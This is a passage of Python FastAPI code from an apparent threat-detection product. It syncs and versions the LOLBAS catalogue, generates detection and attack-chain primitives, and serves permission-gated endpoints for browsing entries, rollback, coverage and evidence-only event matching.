        return _persist_version(stages, upstream_count, imported, valid,
                                                 invalid, diff, principal,
                                                 outcome="PARSE_FAILED")
    if not isinstance(data, list):
        stages["PARSED"] = {"status": "FAIL",
                                        "detail": "upstream must be a JSON list"}
        return _persist_version(stages, upstream_count, imported, valid,
                                                 invalid, diff, principal,
                                                 outcome="PARSE_FAILED")
    upstream_count = len(data)
    stages["PARSED"] = {"status": "OK", "entries": upstream_count}

    # 4 · VALIDATED
    seen_names: set[str] = set()
    validated: list[dict] = []
    for i, raw in enumerate(data):
        errs = _validate_entry(raw, i)
        name = (raw.get("Name") if isinstance(raw, dict) else None) or f"__idx_{i}"
        if name in seen_names:
            errs.append(f"[{name}] duplicate Name")
        seen_names.add(name)
        if errs:
            invalid += 1
            invalid_errors.extend(errs)
        else:
            valid += 1
            validated.append(raw)
    stages["VALIDATED"] = {
        "status": "OK" if invalid == 0 else "PARTIAL",
        "valid": valid, "invalid": invalid,
        "errors_sample": invalid_errors[:20],
    }

    # 5 · NORMALIZED
    upstream_version = f"sha256:{upstream_hash[:12]}"
    normalised = [_normalise(r, upstream_version) for r in validated]
    stages["NORMALIZED"] = {"status": "OK", "normalised": len(normalised)}

    # 6 · INDEXED (compute diff vs. current active set then replace)
    prev_names: set[str] = set()
    if _entries() is not None:
        prev_names = {d["name"] for d in _entries().find({}, {"_id": 0, "name": 1})}
    new_names = {e["name"] for e in normalised}
    diff["added"]    = sorted(new_names - prev_names)
    diff["removed"]  = sorted(prev_names - new_names)
    modified: list[str] = []
    if _entries() is not None:
        for e in normalised:
            cur = _entries().find_one({"name": e["name"]}, {"_id": 0,
                                                                                    "upstream_version": 1})
            if cur and cur.get("upstream_version") and \
                    cur["upstream_version"] != upstream_version:
                modified.append(e["name"])
    diff["modified"] = modified
    # Replace-in-place: upsert each entry, delete entries no longer upstream.
    for e in normalised:
        _entries().update_one(
            {"name": e["name"]},
            {"$set": {**e, "indexed_at": now},
              "$setOnInsert": {"disabled_tenants": []}},
            upsert=True,
        )
    if diff["removed"]:
        _entries().delete_many({"name": {"$in": diff["removed"]}})
    imported = len(normalised)
    stages["INDEXED"] = {"status": "OK", "imported": imported,
                                    "added": len(diff["added"]),
                                    "removed": len(diff["removed"]),
                                    "modified": len(diff["modified"])}

    # 7 · PRIMITIVES_GENERATED
    _primitives().delete_many({})
    total_prims = 0
    all_prims: list[dict] = []
    indexed_names: set[str] = set()
    for e in normalised:
        prims = _generate_primitives(e)
        for p in prims:
            p["indexed_at"] = now
        total_prims += len(prims)
        all_prims.extend(prims)
        indexed_names.add(e["name"].lower())
    # Emit parent-child primitives for LOLBINs the curated registry
    # covers but which upstream does not carry (e.g. `powershell.exe`).
    extra = _global_parent_child_primitives(indexed_names)
    for p in extra:
        p["indexed_at"] = now
    total_prims += len(extra)
    all_prims.extend(extra)
    # Emit multi-hop attack-chain primitives.
    for ch in _ATTACK_CHAINS:
        hops = [h.lower() for h in ch["chain"]]
        if len(hops) < 2:
            continue
        value    = "->".join(hops)
        all_prims.append({
            "id":           f"pri_{uuid.uuid4().hex[:20]}",
            "entry_name":   hops[-1],   # child
            "kind":         _KIND_CHAIN,
            "value":        value, "value_lc": value,
            "chain_label":  ch["label"], "mitre": ch.get("mitre"),
            "description":  ch.get("description"),
            "hops":         hops, "indexed_at": now, "synthetic": True,
        })
        total_prims += 1
    if all_prims:
        _primitives().insert_many(all_prims)
        try:
            _primitives().create_index([("kind", ASCENDING),
                                                       ("value_lc", ASCENDING)])
            _primitives().create_index([("entry_name", ASCENDING)])
        except Exception:  # noqa: BLE001,S110 · index creation is best-effort; failure does not fail the pack
            pass
    stages["PRIMITIVES_GENERATED"] = {"status": "OK",
                                                                  "primitives": total_prims}

    # 8 · ATTACK_MAPPED — every normalised entry must have >=1 valid MitreID
    #        OR must be explicitly recorded as attack-unmapped.
    mapped, unmapped = 0, []
    for e in normalised:
        mids = [m for m in e.get("mitre_ids") or [] if _MITRE_RE.match(m or "")]
        if mids:
            mapped += 1
        else:
            unmapped.append(e["name"])
    stages["ATTACK_MAPPED"] = {"status": "OK", "mapped": mapped,
                                                "unmapped": len(unmapped),
                                                "unmapped_sample": unmapped[:20]}

    # 9 · REGRESSION_TESTED (deterministic content self-tests)
    reg = _run_regression()
    stages["REGRESSION_TESTED"] = {
        "status": "OK" if not reg["failed"] else "FAIL",
        **reg,
    }

    # 10 · COMPLETE gate: DISCOVERED..REGRESSION_TESTED all OK,
    #      and invalid == 0 (every upstream entry accepted).
    every_stage_ok = all(
        stages[s]["status"] == "OK"
        for s in ["DISCOVERED", "DOWNLOADED", "PARSED", "NORMALIZED",
                     "INDEXED", "PRIMITIVES_GENERATED", "ATTACK_MAPPED",
                     "REGRESSION_TESTED"]
    )
    fully_valid = (invalid == 0)
    if every_stage_ok and fully_valid:
        stages["COMPLETE"] = {"status": "OK",
                                          "coverage_pct": 100.0 if upstream_count else 0.0}
        outcome = "COMPLETE"
    else:
        cov = round(100.0 * valid / max(upstream_count, 1), 3)
        stages["COMPLETE"] = {"status": "PARTIAL", "coverage_pct": cov,
                                          "reason": "not-every-upstream-entry-passed"}
        outcome = "PARTIAL"

    version_doc = _persist_version(
        stages, upstream_count, imported, valid, invalid, diff,
        principal, outcome=outcome, upstream_version=upstream_version,
        upstream_sha=upstream_hash, upstream_url=used_url,
    )
    return version_doc


def _persist_version(stages: dict, upstream_count: int, imported: int,
                                  valid: int, invalid: int, diff: dict,
                                  principal: tuple[str, str, str],
                                  *, outcome: str,
                                  upstream_version: str = "",
                                  upstream_sha: str = "",
                                  upstream_url: str = LOLBAS_UPSTREAM_URL) -> dict:
    ten, pid, pkd = principal
    now = datetime.now(timezone.utc).isoformat()
    doc = {
        "id":               f"lolbas_v_{uuid.uuid4().hex[:16]}",
        "outcome":          outcome,
        "stages":           stages,
        "upstream_count":   upstream_count,
        "imported":         imported,
        "valid":            valid,
        "invalid":          invalid,
        "coverage_pct":     stages.get("COMPLETE", {}).get("coverage_pct"),
        "upstream_version": upstream_version,
        "upstream_sha256":  upstream_sha,
        "upstream_url":     upstream_url,
        "source":           LOLBAS_SOURCE,
        "license":          LOLBAS_LICENSE,
        "diff":             diff,
        "synced_at":        now,
        "synced_by":        pid,
        "active":           outcome == "COMPLETE",
    }
    # If new pack is COMPLETE, deactivate every prior version.
    if _versions() is not None:
        if doc["active"]:
            _versions().update_many({"active": True},
                                                     {"$set": {"active": False}})
        _versions().insert_one(dict(doc))

    # Emit audit
    try:
        emit_audit(
            tenant_id=ten, principal_id=pid, principal_kind=pkd,
            action="LOLBAS_SYNCED", resource_kind="content_pack",
            resource_id=doc["id"],
            outcome=("SUCCESS" if outcome == "COMPLETE" else "PARTIAL"),
            after={"outcome": outcome,
                        "upstream_count": upstream_count,
                        "imported": imported, "invalid": invalid,
                        "upstream_version": upstream_version,
                        "coverage_pct": doc["coverage_pct"],
                        "added":    len(diff["added"]),
                        "removed":  len(diff["removed"]),
                        "modified": len(diff["modified"])},
        )
    except Exception:  # noqa: BLE001,S110 · audit emission must never break a sync response
        pass
    doc.pop("_id", None)
    return doc


# ── Endpoints ─────────────────────────────────────────────────────
@router.post("/sync",
                       dependencies=[Depends(require_permission("lolbas.sync"))])
def sync_now(request: Request,
                     url: str | None = Query(None,
                         description="Override upstream URL (also accepts file://)"),
                     use_bundled_fallback: bool = Query(True,
                         description="If primary upstream is unreachable, fall back to the bundled snapshot")):
    if _db() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    fallbacks = [LOLBAS_BUNDLED_URL] if (use_bundled_fallback and LOLBAS_BUNDLED_URL) else []
    return {"ok": True, "data": _sync_pipeline(
        url or LOLBAS_UPSTREAM_URL, _principal(request),
        fallback_urls=fallbacks)}


@router.post("/ensure-synced",
                       dependencies=[Depends(require_permission("lolbas.sync"))])
def ensure_synced_endpoint(request: Request):
    """Idempotent boot-time sync.  If DB already has an active COMPLETE
    version whose SHA matches the current upstream (or bundled), skips
    the pipeline entirely.  Falls back to the bundled snapshot if the
    live upstream is unreachable — a cold-boot pod is NEVER empty.
    """
    if _db() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    doc = ensure_synced(_principal(request))
    return {"ok": True, "data": doc}


def ensure_synced(principal: tuple[str, str, str] | None = None) -> dict:
    """Public helper — safe to call from FastAPI startup.

    Rules (all deterministic, no fabrication):
      1.  If versions collection ALREADY has an active COMPLETE
          version → return it, no work.
      2.  Otherwise run the full pipeline against LOLBAS_UPSTREAM_URL
          with the bundled snapshot as a fallback.
      3.  If everything fails (no upstream, no bundle, storage down)
          → return an honest UPSTREAM_UNAVAILABLE version doc.

    Never raises.
    """
    principal = principal or ("default", "system@boot", "system")
    if _db() is None:
        return {"outcome": "STORAGE_UNAVAILABLE"}
    if _versions() is not None:
        active = _versions().find_one({"active": True}, {"_id": 0})
        # If active COMPLETE and entries exist, we're done.
        if (active and active.get("outcome") == "COMPLETE"
                and _entries() is not None
                and _entries().count_documents({}) > 0):
            return {**active, "already_synced": True}
    fallbacks = [LOLBAS_BUNDLED_URL] if LOLBAS_BUNDLED_URL else []
    return _sync_pipeline(LOLBAS_UPSTREAM_URL, principal,
                                        fallback_urls=fallbacks, idempotent=True)


@router.get("/status",
                     dependencies=[Depends(require_permission("lolbas.read"))])
def status(request: Request):
    if _db() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    ten, _, _ = _principal(request)
    active = None
    if _versions() is not None:
        active = _versions().find_one({"active": True}, {"_id": 0})
    total_entries = _entries().count_documents({}) if _entries() is not None else 0
    total_prims   = _primitives().count_documents({}) if _primitives() is not None else 0
    disabled_ct   = 0
    if _entries() is not None:
        disabled_ct = _entries().count_documents(
            {"disabled_tenants": ten},
        )
    return {"ok": True, "data": {
        "active_version": active,
        "entries_total":  total_entries,
        "primitives_total": total_prims,
        "enabled_for_tenant":  total_entries - disabled_ct,
        "disabled_for_tenant": disabled_ct,
        "source":  LOLBAS_SOURCE,
        "license": LOLBAS_LICENSE,
        "upstream_url": LOLBAS_UPSTREAM_URL,
        "bundled_fallback_available": bool(LOLBAS_BUNDLED_URL),
        "sync_state": ("SYNCED"       if (active and active.get("outcome") == "COMPLETE" and total_entries > 0)
                              else "PARTIAL"       if (active and active.get("outcome") == "PARTIAL")
                              else "UPSTREAM_UNAVAILABLE" if active
                              else "NEVER_SYNCED"),
    }}


@router.get("/entries",
                     dependencies=[Depends(require_permission("lolbas.read"))])
def list_entries(request: Request,
                          category: str | None = Query(None),
                          mitre: str | None = Query(None),
                          q: str | None = Query(None,
                              description="substring match on name or description"),
                          enabled: bool | None = Query(None),
                          skip: int = Query(0, ge=0),
                          limit: int = Query(200, ge=1, le=1000)):
    if _entries() is None:
        return {"ok": False, "error": {"code": "STORAGE_UNAVAILABLE"}}
    ten, _, _ = _principal(request)
    query: dict[str, Any] = {}
    if category: query["categories"] = category.lower()
    if mitre:    query["mitre_ids"]  = mitre.upper()
    if q:
        query["$or"] = [
            {"name":        {"$regex": re.escape(q), "$options": "i"}},
            {"description": {"$regex": re.escape(q), "$options": "i"}},
        ]
    if enabled is True:
        query["disabled_tenants"] = {"$ne": ten}
    if enabled is False:
        query["disabled_tenants"] = ten
    total = _entries().count_documents(query)
    cur = _entries().find(query, {"_id": 0, "raw_upstream": 0}).sort(
        "name", ASCENDING).skip(skip).limit(limit)
    rows = list(cur)
    for r in rows:
        r["enabled_for_tenant"] = ten not in (r.get("disabled_tenants") or [])
    return {"ok": True, "data": {"entries": rows, "count": len(rows),
                                                      "total": total}}


@router.get("/entries/{name}",
                     dependencies=[Depends(require_permission("lolbas.read"))])
def get_entry(name: str, request: Request):
    if _entries() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    ten, _, _ = _principal(request)
    doc = _entries().find_one({"name": name}, {"_id": 0})
    if not doc:
        raise HTTPException(status_code=404, detail="entry not found")
    doc["enabled_for_tenant"] = ten not in (doc.get("disabled_tenants") or [])
    # Attach generated primitives
    prims = list(_primitives().find({"entry_name": name}, {"_id": 0}).limit(500))
    doc["primitives"] = prims
    doc["primitives_count"] = len(prims)
    return {"ok": True, "data": doc}


@router.post("/entries/{name}/disable",
                       dependencies=[Depends(require_permission("lolbas.disable"))])
def disable_entry(name: str, request: Request):
    if _entries() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    ten, pid, pkd = _principal(request)
    doc = _entries().find_one({"name": name})
    if not doc:
        raise HTTPException(status_code=404, detail="entry not found")
    _entries().update_one({"_id": doc["_id"]},
                                        {"$addToSet": {"disabled_tenants": ten}})
    audit = emit_audit(tenant_id=ten, principal_id=pid, principal_kind=pkd,
                                action="LOLBAS_ENTRY_DISABLED",
                                resource_kind="lolbas_entry", resource_id=name)
    return {"ok": True, "data": {"name": name, "disabled": True},
                 "audit_ref": audit["id"]}


@router.post("/entries/{name}/enable",
                       dependencies=[Depends(require_permission("lolbas.disable"))])
def enable_entry(name: str, request: Request):
    if _entries() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    ten, pid, pkd = _principal(request)
    doc = _entries().find_one({"name": name})
    if not doc:
        raise HTTPException(status_code=404, detail="entry not found")
    _entries().update_one({"_id": doc["_id"]},
                                        {"$pull": {"disabled_tenants": ten}})
    audit = emit_audit(tenant_id=ten, principal_id=pid, principal_kind=pkd,
                                action="LOLBAS_ENTRY_ENABLED",
                                resource_kind="lolbas_entry", resource_id=name)
    return {"ok": True, "data": {"name": name, "enabled": True},
                 "audit_ref": audit["id"]}


@router.get("/primitives",
                     dependencies=[Depends(require_permission("lolbas.read"))])
def list_primitives(kind: str | None = Query(None),
                                  entry: str | None = Query(None),
                                  skip: int = Query(0, ge=0),
                                  limit: int = Query(500, ge=1, le=5000)):
    if _primitives() is None:
        return {"ok": False, "error": {"code": "STORAGE_UNAVAILABLE"}}
    q: dict[str, Any] = {}
    if kind:  q["kind"]       = kind
    if entry: q["entry_name"] = entry
    total = _primitives().count_documents(q)
    cur = _primitives().find(q, {"_id": 0}).skip(skip).limit(limit)
    rows = list(cur)
    return {"ok": True, "data": {"primitives": rows, "count": len(rows),
                                                      "total": total}}


@router.get("/versions",
                     dependencies=[Depends(require_permission("lolbas.read"))])
def list_versions(limit: int = Query(20, ge=1, le=200)):
    if _versions() is None:
        return {"ok": False, "error": {"code": "STORAGE_UNAVAILABLE"}}
    cur = _versions().find({}, {"_id": 0}).sort("synced_at", DESCENDING).limit(limit)
    return {"ok": True, "data": {"versions": list(cur)}}


@router.post("/rollback/{version_id}",
                       dependencies=[Depends(require_permission("lolbas.rollback"))])
def rollback(version_id: str, request: Request):
    """Mark a previously-COMPLETE version as active.  Does NOT re-fetch
    upstream — it is intended for quickly reverting when a bad sync
    is caught in production.  Data on disk for that version is still
    the freshly-indexed set; rollback only flips `active` markers and
    audit-emits the operator's intent.
    """
    if _versions() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    ten, pid, pkd = _principal(request)
    target = _versions().find_one({"id": version_id})
    if not target:
        raise HTTPException(status_code=404, detail="version not found")
    if target.get("outcome") != "COMPLETE":
        raise HTTPException(status_code=409,
            detail="cannot roll back to a non-COMPLETE version")
    _versions().update_many({"active": True}, {"$set": {"active": False}})
    _versions().update_one({"id": version_id}, {"$set": {"active": True}})
    audit = emit_audit(tenant_id=ten, principal_id=pid, principal_kind=pkd,
                                action="LOLBAS_ROLLED_BACK",
                                resource_kind="content_pack",
                                resource_id=version_id)
    return {"ok": True, "data": {"active_version": version_id},
                 "audit_ref": audit["id"]}


@router.get("/coverage",
                     dependencies=[Depends(require_permission("lolbas.read"))])
def coverage(request: Request):
    if _versions() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    active = _versions().find_one({"active": True}, {"_id": 0})
    if not active:
        return {"ok": True, "data": {"status": "NEVER_SYNCED"}}
    return {"ok": True, "data": {
        "upstream_count":   active.get("upstream_count"),
        "imported":         active.get("imported"),
        "valid":            active.get("valid"),
        "invalid":          active.get("invalid"),
        "coverage_pct":     active.get("coverage_pct"),
        "upstream_version": active.get("upstream_version"),
        "synced_at":        active.get("synced_at"),
        "stages":           active.get("stages"),
        "diff":             active.get("diff"),
    }}


@router.post("/match",
                       dependencies=[Depends(require_permission("lolbas.read"))])
def match(body: MatchBody, request: Request):
    """Deterministic evidence-only matcher.  Never returns a verdict.

    Contract:
        LOLBIN identity is a CAPABILITY, not a verdict.
        parent-child SUSPICIOUS/ABNORMAL is evidence, not a verdict.
        attack-chain matches are evidence, not verdicts.
        Only the Correlation + Verdict engines determine final outcome.
    """
    if _primitives() is None:
        raise HTTPException(status_code=503, detail="storage unavailable")
    ten, _, _ = _principal(request)
    hits = _match_event(ten, body.model_dump(exclude_none=True))
    # Deterministic aggregate signal — helpful debug for analysts, still
    # NOT a verdict.  The correlation engine reads `hits[*]` directly.
    strength_score = {"OBSERVED": 0, "INFORMATIONAL": 0,
                                  "WEAK": 1, "MODERATE": 3, "STRONG": 5}
    aggregate = sum(strength_score.get(h.get("signal_strength", ""), 0)
                              for h in hits)
    disposition = "OBSERVED"
    if aggregate >= 12:  disposition = "CORRELATION_CANDIDATE"
    elif aggregate >= 6: disposition = "CONTEXTUALIZED"
    elif aggregate >= 2: disposition = "OBSERVED_WITH_SIGNAL"
    return {"ok": True, "data": {
        "hits": hits, "count": len(hits),
        "aggregate_signal_score": aggregate,
        "disposition": disposition,
        "contract": {
            "principle": "Living-off-the-land binary is a CAPABILITY, not a verdict.",
            "note": ("Every hit is EVIDENCE.  Only the correlation + "
                          "verdict engines produce a verdict — NivXRay never "
                          "escalates a LOLBIN identity or a single parent-child "
                          "tier to MALICIOUS by itself."),
        },
    }}
